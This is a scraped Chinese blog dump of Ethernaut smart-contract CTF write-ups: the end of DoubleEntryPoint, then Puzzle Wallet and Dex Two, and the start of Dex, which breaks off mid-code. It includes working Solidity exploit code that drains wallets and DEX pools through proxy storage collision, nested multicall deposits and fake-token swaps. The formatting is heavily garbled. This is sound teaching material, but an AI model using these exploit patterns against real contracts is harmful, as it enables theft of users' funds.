Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);&#125; 这个修改器的作用是触发 Forta 检测系统实现的一些逻辑。**它在本地存储执行代码函数之前**引发的警报数量，并将该数字与执行调用函数修饰符的函数主体**之后**引发的警报数量进行比较。 如果警报数量增加，交易将**恢复**并显示消息`&quot;Alert has been triggered, reverting&quot;`。 让我们回顾一下调用`LegacyToken`“遗留”时令牌也使用的重要功能。`LegacyToken.transfer` 12345678function delegateTransfer( address to, uint256 value, address origSender) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true;&#125; 如果查看函数修饰符列表，您会看到 - `onlyDelegateFrom`只允许`delegateFrom`调用此函数。在这种情况下，只`LegacyToken`允许合约调用此函数，否则将允许任何人调用`_transfer`（即低级 ERC20 传输）来自`origSender` - `fortaNotify`是一个特殊的功能修饰符，可以触发一些特定的 Forta 逻辑，就像我们之前看到的那样 函数本身很简单，就是调用函数的ERC20内部实现`_transfer`。请记住，`_transfer`只检查 that`to`和`origSender`are not`address(0)`以及`origSender`有足够的令牌可以转移到`to`（它还检查不足/溢出条件）但它不检查 that `origSender`is`msg.sender`或消费者是否有足够的津贴。这就是为什么我们有修饰符`onlyDelegateFrom`。 ### `CryptoVault.sol` 12345678910111213141516171819202122contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) public &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125;&#125; 合约应实现普通加密 Vault 系统的逻辑。对于挑战的范围而言，这部分逻辑并不有趣。 由于任何金库也`CryptoVault`有一个基础令牌，在这种情况下是`DoubleEntryPoint`. 任何人都可以调用的函数`sweepToken`允许金库将任意`token`（指定为输入参数）的整个金库余额转移到`sweptTokensRecipient`. 收件人应该是安全的，因为它是由合同的部署者及时初始化的`constructor`。 从代码中可以看出，唯一完成的检查是防止 Vault 转移令牌`underlying`。 ### 通过部署 Forta DetectionBot 找到漏洞并阻止它 通过结合我们收集到的所有信息，您是否发现了我们可以利用的漏洞？回顾一下我们现有的知识： - `CryptoVault`的`underlying`令牌是`DoubleEntryPoint`。该合约提供了一个`sweepToken`在 Vault 中转移代币的方法，但它阻止了清除`DoubleEntryPoint`代币（因为它是`underlying`） - `DoubleEntryPoint`token 是一个 ERC20 令牌，它实现了一个`delegateTransfer`只能由`LegacyToken`令牌调用的自定义函数，并且由 Forta 通过执行函数修饰符来监控`fortaNotify`。该函数允许委托人将一定数量的代币从`origSpender`任意接收者转移 - `LegacyToken`是已“弃用”的 ERC20 令牌。当`transfer(address to, uint256 value)`函数被调用时`DoubleEntryPoint`，（令牌的“新版本”）`delegate.delegateTransfer(to, value, msg.sender)`被调用 问题在哪里？因为`LegacyToken.transfer`是“镜像”，`DoubleEntryPoint.transfer`这意味着当您要求尝试转移 1 个时，`LegacyToken`实际上您转移的是 1 个`DoubleEntryPoint`代币（为了能够做到这一点，您的余额中必须同时拥有这两个代币） 包含`CryptoVault`两个令牌中的 100 个，但`sweepToken`仅阻止`underlying` `DoubleEntryPoint`. 但是通过了解其工作原理，我们可以通过调用`LegacyToken`轻松扫除所有令牌。`DoubleEntryPoint``CryptoVault.sweep(address(legacyTokenContract))` 现在我们知道如何利用它，我们如何利用 Forta 集成来**防止**利用并恢复交易？我们可以构建一个扩展 Forta 的合约`IDetectionBot`并将其插入`DoubleEntryPoint`. 通过这样做，我们应该能够在 Vault`sweepToken`触发`LegacyToken.transfer`将触发`DoubleEntryPoint.delegateTransfer`将触发（在执行函数代码之前）函数`fortaNotify`修饰符时防止利用。是的，我知道执行链很深，但请耐心等待，我们明白了！ 合约`IDetectionBot`接口只有一个函数签名`function handleTransaction(address user, bytes calldata msgData) external;`，可以通过`DoubleEntryPoint.delegateTransfer`这些参数直接调用`forta.notify(player, msg.data)`。 只有在这两个条件都为真时，我们才会在内部`DetectionBot`发出警报： - 原始发件人（正在呼叫的人`DoubleEntryPoint.delegateTransfer`）是`CryptoVault` - 调用函数的签名（的前 4 个字节`calldata`）等于`delegateTransfer`签名 让我们`origSender`从中提取值`msgData`（请记住，在本例中，该参数值等于`msg.data`）。如果您查看“特殊变量和函数”部分下的[块和交易属性](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties)`msg.data`的 Solidity 文档，您会看到这是一种代表**完整 calldata 的**`bytes calldata`数据类型。这是什么意思？在这些字节中，您将同时拥有函数选择器（4 个字节）和函数有效负载。 要提取参数，我们可以简单地使用`abi.decode`这样的`(address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));`。一个重要的注意事项：我们假设在这些字节中，这些特定类型的三个值以这些特定顺序排列。我们正在做一个非常**艰难的假设**。这就是为什么我们需要将此信息与函数签名与强制执行这些类型和顺序要求的函数签名相匹配这一事实结合起来`delegateTransfer`。 1msgData`第二部分非常简单，我们只需通过合并前 4 个字节来重建调用签名，`bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]);`并将其与我们知道的正确签名进行比较`delegateTransfer`→`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ## 解决方案代码 让我们看看检测的整个代码`DetectionBot` 12345678910111213141516171819contract DetectionBot is IDetectionBot &#123; address private monitoredSource; bytes private monitoredSig; constructor(address _monitoredSource, bytes memory _monitoredSig) public &#123; monitoredSource = _monitoredSource; monitoredSig = _monitoredSig; &#125; function handleTransaction(address user, bytes calldata msgData) external override &#123; (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address)); bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]); if (origSender == monitoredSource &amp;&amp; keccak256(callSig) == keccak256(monitoredSig)) &#123; IForta(msg.sender).raiseAlert(user); &#125; &#125;&#125; 在构造函数内部，第一个参数将是我们要监视的源，在本例中是地址，`CryptoVault`第二个参数是我们打算监视的函数的签名，在本例中是`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)`。 现在我们只需要部署传递正确参数的机器人并将机器人插入 Forta 系统并解决挑战。我们走吧！ 12345678910111213141516function exploitLevel() internal override &#123; vm.startPrank(player, player); // Create and deploy the `DetectionBot` with the correct constructor paramter // The first one is the source we want to monitor // The second one is the signature of the function we want to match DetectionBot bot = new DetectionBot( level.cryptoVault(), abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ); // add the bot to the Forta network detection system that monitor the `DoubleEntryPoint` contract level.forta().setDetectionBot(address(bot)); vm.stopPrank();&#125; 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Puzzle Wallet","slug":"Smart contracts/ethernaut/Puzzle Wallet","date":"2023-03-12T04:10:10.000Z","updated":"2023-03-12T04:10:10.000Z","comments":true,"path":"2023/03/12/Smart contracts/ethernaut/Puzzle Wallet/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/12/Smart%20contracts/ethernaut/Puzzle%20Wallet/","excerpt":"","text":"Puzzle Wallet（不会）1. 题目要求 1.1 Nowadays, paying for DeFi operations is impossible, fact. A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this. They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners. Little did they know, their lunch money was at risk… You’ll need to hijack this wallet to become the admin of the proxy. Things that might help:: Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one. Knowing about proxy patterns and the way they handle storage variables. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; pragma experimental ABIEncoderV2; import &quot;../helpers/UpgradeableProxy-08.sol&quot;; contract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125; &#125; contract PuzzleWallet &#123; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] += msg.value; &#125; function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] -= value; (bool success, ) = to.call&#123; value: value &#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768## 2. 分析#### tips: [参考博客](https://stermi.xyz/blog/ethernaut-challenge-23-solution-puzzle-wallet)如果您是代理世界的新手，我强烈建议您先阅读所有这些内容：- [OpenZeppelin 代理](https://docs.openzeppelin.com/contracts/4.x/api/proxy)- [OpenZeppelin 代理升级模式](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies)- [OpenZeppelin Transparent 与 UUPS 代理](https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups)- [（视频）OpenZeppelin 部署更高效的可升级合约](https://www.youtube.com/watch?v=kWUDTZhxKZI)- [（视频）OpenZeppelin # 智能合约升级的安全性](https://www.youtube.com/watch?v=5WE6PEc305w&amp;t=3945s)**⚠️ 重要 ⚠️**这只是关于代理如何工作的基本解释，如果您需要使用它们或在现实生活场景中实施，请自行研究。我会尝试在一个非常高的层次上解释它，所以请耐心等待。代理/实现模式背后的想法是有两个不同的合约，它们的行为如下：- 用户与 Proxy 合约交互，所有的“数据”都存储在这里。您可以将此合约视为前端。代理合约会将所有用户交互“转发”给实施合约- Proxy合约的所有实现都在Implementation合约中实现。这允许代理所有者在某个时候升级指向实施合约的“指针”，以防他想要修复错误或实施新功能。代理合约内部通常没有太多代码（只有管理升级/授权的代码）并且具有将`fallback`所有用户交互“转发”到包含该功能的实际实现的实现合约的功能。这种“转发”操作是通过`delegatecall`.在这一点上，我假设您已经知道 a 是如何`delegatecall`工作的，但如果您对所有这些都不熟悉，请阅读此内容- [Solidity 文档：Delegatecall / Callcode 和库](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)- [Sigma Prime，Solidity Security：已知攻击媒介和常见反模式的综合列表：delegatecall](https://blog.sigmaprime.io/solidity-security.html#delegatecall)当通过函数`ContractA`调用`ContractB`的函数在代码上执行时，但整个**上下文**（和合约的存储）是来自.`implementation()``delegatecall``ContractB``msg.sender``msg.value``ContractA`要记住的一个关键概念是，如果`ContractB`代码在 a 期间更新合约的存储，`delegatecall`它不会**修改`ContractB`存储，而是修改`ContractA`存储！**`delegatecall`是一个强大的工具，但如果使用不当，它也非常复杂和危险。考虑到所有这些解释，让我们看看合同### `PuzzleProxy.sol````soliditycontract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor( address _admin, address _implementation, bytes memory _initData ) public UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin() &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125;&#125; 这是代理合约，每个用户将直接与这个合约交互，当函数（在 中实现）被执行时，它将把所有内容转发给合约PuzzleWallet。delegatecall``fallback``UpgradeableProxy fallback仅当上述函数均未被调用时才会执行该函数。 除了转发呼叫之外，该合约还处理角色admin，即创建角色以将代理“升级”到新的实现，以防需要修复错误或必须将新功能添加到合约中。 任何人都可以通过 提议新管理员proposeAdmin(address)，但只有当前管理员可以通过 批准新管理员approveNewAdmin。 PuzzleWallet.sol1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162contract PuzzleWallet &#123; using SafeMath for uint256; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted() &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] = balances[msg.sender].add(msg.value); &#125; function execute( address to, uint256 value, bytes calldata data ) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] = balances[msg.sender].sub(value); (bool success, ) = to.call&#123;value: value&#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125;&#125; 这是一份很长的合同，但重要的部分在这里。 为了进行execute交易，您必须在whitelisted映射中。与请求发送到的请求相比，只有execute余额msg.sender( )balances[msg.sender]``value``to whitelisted只能通过owner合约的将用户添加到映射中 白名单用户可以调用deposit将 ETH 存入合约并更新余额 支付更少的gas交易可以通过multicall函数批量执行 multicall函数只允许将一个 deposit呼叫添加到批处理呼叫列表的列表中。这样做是为了防止有人通过发送 X 数量的 ETH但在批处理交易列表中multicall多次调用deposit 利用合同在审查代码之后，你是否至少发现了一些问题在哪里？我会给你一些提示： 合约和代理的布局存储 合同执行期间的上下文delegatecall 好的，让我们进入兔子洞。 首先，PuzzleProxy不要PuzzleWallet有相同的布局存储。这意味着当它在fromPuzzleWallet期间执行某些代码时修改状态变量时，它可能会无意中更改错误变量的值。delegatecall``PuzzleProxy 让我们举个例子。我调用PuzzleProxy.proposeNewAdmin(player)提议player地址作为代理合约的新管理员。该proposeNewAdmin函数更新pendingAdmin位于**.slot 0**中的变量PuzzleProxy。 你知道合约的Slot 0里有什么吗PuzzleWallet？变量address public owner！你知道这是什么意思吗？这意味着当通过fromPuzzleWallet执行函数时，现在是!delegatecall``PuzzleProxy``pendingAdmin``owner 所以现在我们是的owner，PuzzleWallet但我们的最终目标是成为admin的PuzzleProxy。我们可以利用相同的漏洞利用，为此我们必须找到一种方法让a执行时PuzzleWallet修改布局存储的Slot 1 。delegatecall 在合约的Slot 1PuzzleWallet上，有maxBalance变量。我们只需要通过将 Player 地址转换为整数来更新该值uint256(player)。 修改该变量的唯一函数是setMaxBalance只能由白名单用户调用并且当合约余额为 0 时调用。 我们现在是合约的所有者（由于漏洞利用），因此我们可以通过调用将自己添加到白名单中，addToWhitelist但我们仍然需要解决余额问题。 我们现在终于可以打电话了吗setMaxBalance(uint256(player))？没有！ 1234function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance;&#125; 如果您查看代码，如果合约中有任何余额并且合约是0.001 ether由部署者在部署方资助的，交易将恢复。 要完成挑战并成为代理人，我们必须通过调用并使用该余额admin来耗尽合约。问题是 execute 只会使用用户的余额，如果它等于并且我们无法利用该机制。execute``0.001 ether``msg.sender 我们不能依赖deposit，因为即使我们存入一些东西然后调用execute我们也不能使用超过我们存入的东西。那么现在怎么办？ 让我们看一下multicall功能代码，看看那里是否有我们可以利用的东西 1234567891011121314151617function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125;&#125; 该函数允许用户将多个调用一起批处理以节省一些 gas，并且如您所见，它有一个检查以允许deposit在批处理调用中只允许一个调用。需要进行此检查以防止有人在发送一些以太币时添加多个deposit。如果没有该支票，您将能够对发送的以太币进行双重计算。 例如，如果我发送了1 ether两笔存款，在交易结束时，balances[msg.sender]将等于2 etherwhile I’ve sent only 1 ether。 那么，我们如何利用它呢？虽然我们确实不能将两个存款放在一个里面multicall，但如果我们可以将一个deposit然后另一个放在deposit另一个里面呢multicall？ 多呼叫开始！ 让我们准备multicall通话 123456789101112bytes[] memory callsDeep = new bytes[](1);callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);bytes[] memory calls = new bytes[](2);calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);puzzleWallet.multicall&#123;value: 0.001 ether&#125;(calls);// At this point inside the contract there are 0.002 ether (one is from us and one from the PuzzleWalletFactory)// But `balances[player]` is equal to 0.002 ether!// We are able to call the `execute` method in a way that will send to us the whole contract&#x27;s balancepuzzleWallet.execute(player, 0.002 ether, &quot;&quot;); 在execute我们成功地从合约中移除所有以太币余额（并获得0.001免费以太币）之后，我们可以调用puzzleWallet.setMaxBalance(uint256(player)); 通过这样做，我们现在是合同的管理员PuzzleProxy！ 解决方案代码让我们回顾一下我们需要做什么来解决这个挑战 通过调用成为proposeNewAdmin(player)所有者PuzzleWallet``delegatecall 现在我们是所有者（当PuzzleWallet通过访问时delegatecall）我们可以通过以下方式将自己添加到白名单用户列表中addToWhitelist(player); 构建一个批量调用有效负载，以便能够存入0.001 ether但让合约0.002 ether在我们的余额中计入。有关更多详细信息，请参阅上面的解释 执行 multicall，现在PuzzleWallet里面没有以太币了 呼吁setMaxBalance(uint256(player));成为admin的PuzzleProxy 这是用于解决挑战的测试代码 123456789101112131415161718192021222324252627282930function exploitLevel() internal override &#123; vm.startPrank(player, player); // Exploit the contract to become the owner of `PuzzleWallet` level.proposeNewAdmin(player); // Now that we are the admin, add ourself to the whitelisted user list // to be able to deposit, execute and multicall puzzleWallet.addToWhitelist(player); // Build the payload to drain the wallet and be able to call `setMaxBalance` bytes[] memory callsDeep = new bytes[](1); callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); bytes[] memory calls = new bytes[](2); calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector); calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep); puzzleWallet.multicall&#123;value: 0.001 ether&#125;(calls); // Execute the batched calls payload puzzleWallet.execute(player, 0.002 ether, &quot;&quot;); // Become the admin of the `PuzzleProxy` puzzleWallet.setMaxBalance(uint256(player)); // Assert that we have completed the challenge assertEq(level.admin(), player); vm.stopPrank();&#125; 您可以阅读挑战的完整解决方案打开PuzzleWallet.t.sol 3. 解析","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Dex Two","slug":"Smart contracts/ethernaut/Dex Two","date":"2023-03-11T04:15:10.000Z","updated":"2023-03-11T04:15:10.000Z","comments":true,"path":"2023/03/11/Smart contracts/ethernaut/Dex Two/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/11/Smart%20contracts/ethernaut/Dex%20Two/","excerpt":"","text":"Dex Two1. 题目要求 1.1 This level will ask you to break DexTwo, a subtlely modified Dex contract from the previous level, in a different way. You need to drain all balances of token1 and token2 from the DexTwo contract to succeed in this level. You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token. Things that might help: 题目代码 // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;; contract DexTwo is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function add_liquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123; return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))); &#125; function approve(address spender, uint amount) public &#123; SwappableTokenTwo(token1).approve(msg.sender, spender, amount); SwappableTokenTwo(token2).approve(msg.sender, spender, amount); &#125; function balanceOf(address token, address account) public view returns (uint)&#123; return IERC20(token).balanceOf(account); &#125; &#125; contract SwappableTokenTwo is ERC20 &#123; address private _dex; constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123; _mint(msg.sender, initialSupply); _dex = dexInstance; &#125; function approve(address owner, address spender, uint256 amount) public &#123; require(owner != _dex, &quot;InvalidApprover&quot;); super._approve(owner, spender, amount); &#125; &#125; 1234567891011121314151617181920212223## 2. 分析### tips：[参考博客](https://stermi.xyz/blog/ethernaut-challenge-22-solution-dex-two)- 2.1 分析合约： - `swap` 函数 ： - ```solidity function swap( address from, address to, uint256 amount ) public &#123; require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint256 swapAmount = getSwapAmount(from, to, amount); IERC20(from).transferFrom(msg.sender, address(this), amount); IERC20(to).approve(address(this), swapAmount); IERC20(to).transferFrom(address(this), msg.sender, swapAmount); &#125; - 当前`swap`函数不检查`from`，实际上是合约处理的`to`白名单`token1`和代币。`token2``DexTwo` 这是该函数先前版本中存在的检查：`require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);` 这是什么意思？这允许攻击者调用该`swap`函数，出售**任意** 令牌以从 Dex`from`获取“真实”令牌。`to`这意味着我们可以创建一个`UselessERC20`完全由我们拥有和管理的全新代币（我们可以铸造、销毁、做任何我们想做的事）并获得一些`token1`或`token2`免费获得。 我们可以耗尽`DexTwo`合同`token1`并`token2`各打一次电话吗？为此，我们需要找到正确的`fakeToken`卖出数量以取回 100 `token1`。 - 做数学计算，看一下getSwapAmount函数 - &gt; ```unknown &gt; 100 token1 = amountOfFakeTokenToSell * DexBalanceOfToken1 / DexBalanceOfFakeToken &gt; 100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken &gt; 123456 - 我们有两个可以控制的变量。我们肯定知道它`DexBalanceOfFakeToken`必须**&gt; 1**否则交易将因为被**0 除**而恢复。如果我们发送 1`FakeToken`给`DexTwo`我们 - &gt; ```unknown100 token1 = amountOfFakeTokenToSell * 100 / 11 token1 = amountOfFakeTokenToSell - 因此，通过`1 FakeToken1`向`DexTwo`合约发送给它一些流动性，我们可以交换 100`FakeToken`以取回 100 `token1`。之后，我们只需要对**另一个**实例重复相同的操作，并从 Dex 中`FakeToken2`排出所有的。`token2` 攻击合约 function exploitLevel() internal override &#123; vm.startPrank(player, player); // Deploy a fake token based on the SwappableTokenTwo contract // Mint 10k tokens and send them to the player (msg.sender) SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(address(level), &quot;Fake Token 1&quot;, &quot;FKT1&quot;, 10_000); // Approve the dex to manage all of our token token1.approve(address(level), 2**256 - 1); token2.approve(address(level), 2**256 - 1); fakeToken1.approve(address(level), 2**256 - 1); fakeToken2.approve(address(level), 2**256 - 1); // send 1 fake token to the DexTwo to have at least 1 of liquidity ERC20(fakeToken1).transfer(address(level), 1); ERC20(fakeToken2).transfer(address(level), 1); // Swap 100 fakeToken1 to get 100 token1 level.swap(address(fakeToken1), address(token1), 1); // Swap 100 fakeToken2 to get 100 token2 level.swap(address(fakeToken2), address(token2), 1); // Assert that we have drained the Dex contract assertEq(token1.balanceOf(address(level)) == 0 &amp;&amp; token2.balanceOf(address(level)) == 0, true); vm.stopPrank(); &#125; 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Dex","slug":"Smart contracts/ethernaut/Dex","date":"2023-03-10T02:17:10.000Z","updated":"2023-03-10T02:17:10.000Z","comments":true,"path":"2023/03/10/Smart contracts/ethernaut/Dex/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/10/Smart%20contracts/ethernaut/Dex/","excerpt":"","text":"Dex1. 题目要求 1.1 此题目的目标是让您破解下面的基本合约并通过价格操纵窃取资金。 一开始您可以得到10个token1和token2。合约以每个代币100个开始。 如果您设法从合约中取出两个代币中的至少一个，并让合约得到一个的“坏”的token价格，您将在此级别上取得成功。 注意： 通常，当您使用ERC20代币进行交换时，您必须approve合约才能为您使用代币。为了与题目的语法保持一致，我们刚刚向合约本身添加了approve方法。因此，请随意使用 contract.approve(contract.address, ) 而不是直接调用代币，它会自动批准将两个代币花费所需的金额。 请忽略SwappableToken合约。 可能有帮助的注意点： 代币的价格是如何计算的？ approve方法如何工作？ 您如何批准ERC20 的交易？ 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; import &#39;openzeppelin-contracts-08/access/Ownable.sol&#39;; contract Dex is Ownable &#123; address public token1; address public token2; constructor() &#123;&#125; function setTokens(address _token1, address _token2) public onlyOwner &#123; token1 = _token1; token2 = _token2; &#125; function addLiquidity(address token_address, uint amount) public onlyOwner &#123; IERC20(token_address).transferFrom(msg.sender, address(this), amount); &#125; function swap(address from, address to, uint amount) public &#123; require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;); require(IERC20(from).balanceOf(msg.sender) &gt;= amount, &quot;Not enough to swap&quot;); uint 